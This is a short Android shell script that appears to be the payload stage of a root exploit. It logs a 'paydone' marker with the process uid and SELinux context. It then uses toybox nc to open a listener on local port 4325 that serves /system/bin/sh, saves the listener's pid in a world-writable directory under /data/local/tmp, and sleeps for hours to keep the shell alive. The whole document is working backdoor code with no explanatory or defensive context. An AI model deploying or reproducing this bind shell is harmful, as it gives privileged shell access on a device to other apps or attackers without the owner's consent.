#!/system/bin/sh
echo "REROOT paydone uid=$(id -u) ctx=$(cat /proc/self/attr/current)"
log -t REROOT "paydone uid=$(id -u) ctx=$(cat /proc/self/attr/current)"
log -t ROOTSVC "start uid=$(id -u) ctx=$(cat /proc/self/attr/current)"
mkdir -p /data/local/tmp/rootsvc
chmod 0777 /data/local/tmp/rootsvc
toybox nc -s 127.0.0.1 -p 4325 -L /system/bin/sh -l 2>/dev/null &
svc_pid=$!
echo "$svc_pid" > /data/local/tmp/rootsvc/pid.txt
chmod 0644 /data/local/tmp/rootsvc/pid.txt
log -t ROOTSVC "listener pid=$svc_pid"
sleep 36000
